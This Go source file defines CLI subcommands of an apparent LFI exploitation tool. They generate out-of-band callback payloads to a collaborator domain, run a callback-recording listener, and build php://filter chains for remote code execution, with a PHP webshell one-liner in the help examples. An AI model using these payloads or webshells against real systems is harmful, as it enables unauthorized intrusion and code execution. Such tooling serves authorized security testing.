package cli

import (
	"encoding/json"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/bugsyhewitt/exhumed/internal/oob"
	"github.com/bugsyhewitt/exhumed/internal/phpfilter"
	"github.com/spf13/cobra"
)

// newPayloadCmd is the parent for payload-generation subcommands. Payload
// generators emit a string the operator places into a vulnerable parameter;
// they perform no network I/O and confirm nothing themselves.
func newPayloadCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "payload",
		Short: "Generate exploitation payloads (e.g. PHP filter chains for RCE escalation)",
	}
	cmd.AddCommand(newPHPFilterCmd())
	cmd.AddCommand(newOOBCmd())
	return cmd
}

func newOOBCmd() *cobra.Command {
	var (
		domain string
		share  string
		path   string
		label  bool
		asJSON bool
	)

	cmd := &cobra.Command{
		Use:   "oob",
		Short: "Generate out-of-band payloads to confirm blind LFI sinks via an interaction callback",
		Long: `oob generates out-of-band (OOB) payloads for confirming BLIND LFI / path-traversal
sinks — vulnerabilities where the target reads or include()s a file but never
reflects its contents in the HTTP response, so exhumed's body-pattern detection
sees nothing.

Each payload forces the target to make an outbound interaction (DNS, SMB, or
HTTP) to a collaborator domain you control. Observing that interaction at your
collaborator (interactsh, Burp Collaborator, a controlled DNS/HTTP log) proves
the sink fired even with an empty response.

exhumed only GENERATES the payloads; it runs no listener and makes no network
calls. You place each string into the vulnerable parameter and correlate hits
out-of-band yourself. (Automated listener/correlation is a planned follow-on.)

Techniques emitted, most to least reliable:
  smb-unc       \\<domain>\<share>   — Windows include()/file APIs (SMB+DNS)
  http-wrapper  http://<domain>/...  — allow_url_include / URL-fetching sinks
  https-wrapper https://<domain>/... — TLS-only egress
  dns-resolve   \\<domain>\          — DNS lookup only (survives strict egress)

Examples:
  exhumed payload oob --domain abc123.oast.fun
  exhumed payload oob --domain abc123.oast.fun --label --json
  exhumed payload oob --domain x.burpcollaborator.net --share data --path beacon

LEGAL NOTICE: authorized testing only.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			payloads, err := oob.Generate(oob.Options{
				Domain: domain,
				Share:  share,
				Path:   path,
				Label:  label,
			})
			if err != nil {
				return fmt.Errorf("generate oob payloads: %w", err)
			}

			out := cmd.OutOrStdout()
			if asJSON {
				enc := json.NewEncoder(out)
				enc.SetIndent("", "  ")
				if err := enc.Encode(payloads); err != nil {
					return fmt.Errorf("encode json: %w", err)
				}
				return nil
			}

			for _, p := range payloads {
				fmt.Fprintf(out, "%-14s %s\n", p.Technique, p.Value)
			}
			return nil
		},
	}

	cmd.Flags().StringVar(&domain, "domain", "", "collaborator domain you control (required; bare domain, no scheme/path)")
	cmd.Flags().StringVar(&share, "share", "", "SMB share name for UNC payloads (default \"exhumed\")")
	cmd.Flags().StringVar(&path, "path", "", "resource path for http(s) wrapper payloads (default \"exhumed-oob\")")
	cmd.Flags().BoolVar(&label, "label", false, "prepend a per-technique subdomain label so interactions can be attributed by technique")
	cmd.Flags().BoolVar(&asJSON, "json", false, "emit payloads as JSON (value, technique, subdomain, note)")
	_ = cmd.MarkFlagRequired("domain")

	cmd.AddCommand(newOOBListenCmd())
	return cmd
}

// newOOBListenCmd is the correlation half of the OOB workflow: a self-contained
// HTTP collaborator that records the callbacks produced by http(s) OOB payloads
// (from `payload oob`) pointed at it, proving a blind-LFI sink fired even when
// the target reflected nothing in its own response.
//
// It runs a pure-Go net/http listener — no external collaborator service, no
// cgo, no outbound network I/O — for local and lab testing where the operator
// controls DNS or points payloads straight at this listener's address.
func newOOBListenCmd() *cobra.Command {
	var (
		addr   string
		asJSON bool
	)

	cmd := &cobra.Command{
		Use:   "listen",
		Short: "Run a self-contained HTTP collaborator that records OOB callbacks (blind-LFI confirmation)",
		Long: `listen runs a built-in HTTP collaborator that records the out-of-band callbacks
produced by the http:// and https:// payloads from 'exhumed payload oob'.

When a BLIND LFI sink dereferences an http(s) OOB payload that points at this
listener, the resulting request is captured and printed live — proving the sink
read and fetched the attacker-controlled resource even though the target's own
HTTP response showed nothing. If the payloads were generated with --label, each
callback is attributed to its technique via the request's leading Host subdomain.

This listener is fully self-contained: it makes no outbound calls and needs no
external collaborator (interactsh / Burp Collaborator). It is intended for local
and lab use where you control DNS for the collaborator domain — or where you
point payloads straight at this listener's address. For internet-facing blind
testing, an external collaborator with a public resolver is still appropriate.

Each recorded interaction prints: sequence, time, source IP, technique (if
labelled), method, and the requested path. Press Ctrl-C to stop; with --json a
JSON array of all interactions is written to stdout on shutdown.

Examples:
  exhumed payload oob listen --addr :8080
  exhumed payload oob listen --addr 127.0.0.1:0 --json

LEGAL NOTICE: authorized testing only.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			ctx, stop := signal.NotifyContext(cmd.Context(), os.Interrupt, syscall.SIGTERM)
			defer stop()

			out := cmd.OutOrStdout()
			errOut := cmd.ErrOrStderr()

			ln := oob.NewListener(func(in oob.Interaction) {
				tech := string(in.Technique)
				if tech == "" {
					tech = "-"
				}
				fmt.Fprintf(errOut, "[hit #%d] %s  %-15s  %-12s  %s %s\n",
					in.Seq,
					in.At.Format("15:04:05"),
					in.RemoteIP,
					tech,
					in.Method,
					in.Path,
				)
			})

			serveErr := ln.Serve(ctx, addr, func(boundAddr string) {
				fmt.Fprintf(errOut, "[*] OOB collaborator listening on http://%s/ (Ctrl-C to stop)\n", boundAddr)
			})
			if serveErr != nil {
				return fmt.Errorf("oob listener: %w", serveErr)
			}

			interactions := ln.Interactions()
			if asJSON {
				enc := json.NewEncoder(out)
				enc.SetIndent("", "  ")
				if err := enc.Encode(interactions); err != nil {
					return fmt.Errorf("encode json: %w", err)
				}
			} else {
				fmt.Fprintf(errOut, "[*] stopped; recorded %d interaction(s)\n", len(interactions))
			}
			return nil
		},
	}

	cmd.Flags().StringVar(&addr, "addr", ":8080", "address to bind the collaborator listener (host:port; :0 picks a free port)")
	cmd.Flags().BoolVar(&asJSON, "json", false, "on shutdown, write all recorded interactions as a JSON array to stdout")
	return cmd
}

func newPHPFilterCmd() *cobra.Command {
	var (
		rce      string
		resource string
		rawB64   string
		debug    bool
	)

	cmd := &cobra.Command{
		Use:   "php-filter",
		Short: "Generate a php://filter chain that turns a file-read into arbitrary content (RCE via include())",
		Long: `php-filter generates a PHP filter chain using the convert.iconv technique
(loknop / synacktiv). When a target include()/require()s a parameter you control,
the chain reconstructs an arbitrary payload — typically a PHP webshell — from a
resource whose original contents are irrelevant, escalating a file-read primitive
to remote code execution.

The output is a single php://filter/... string. exhumed only GENERATES it; you
place it into the vulnerable parameter yourself. No network access occurs.

Examples:
  exhumed payload php-filter --rce '<?php system($_GET[0]);?>'
  exhumed payload php-filter --rce '<?=phpinfo();?>' --resource php://temp
  exhumed payload php-filter --raw-base64 PD9waHAgcGhwaW5mbygpOz8+ --debug

LEGAL NOTICE: authorized testing only.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			if rce == "" && rawB64 == "" {
				return fmt.Errorf("one of --rce or --raw-base64 is required")
			}
			if rce != "" && rawB64 != "" {
				return fmt.Errorf("--rce and --raw-base64 are mutually exclusive")
			}

			var (
				chain string
				err   error
			)
			if rawB64 != "" {
				// Debugging path: build from a pre-encoded base64 string. --debug
				// emits a chain that surfaces the reconstructed base64 (no final
				// decode) so the operator can verify it against the target first.
				chain, err = phpfilter.GenerateFromBase64(rawB64, resource, !debug)
			} else {
				chain, err = phpfilter.Generate(rce, resource)
			}
			if err != nil {
				return fmt.Errorf("generate php filter chain: %w", err)
			}

			fmt.Fprintln(cmd.OutOrStdout(), chain)
			return nil
		},
	}

	cmd.Flags().StringVar(&rce, "rce", "", "raw payload to reconstruct on the target (e.g. a PHP webshell)")
	cmd.Flags().StringVar(&rawB64, "raw-base64", "", "pre-encoded base64 payload (debug/verification mode)")
	cmd.Flags().StringVar(&resource, "resource", "", "the php://filter resource sink (default php://temp)")
	cmd.Flags().BoolVar(&debug, "debug", false, "with --raw-base64, omit the terminal decode so the chain surfaces base64 for verification")
	return cmd
}
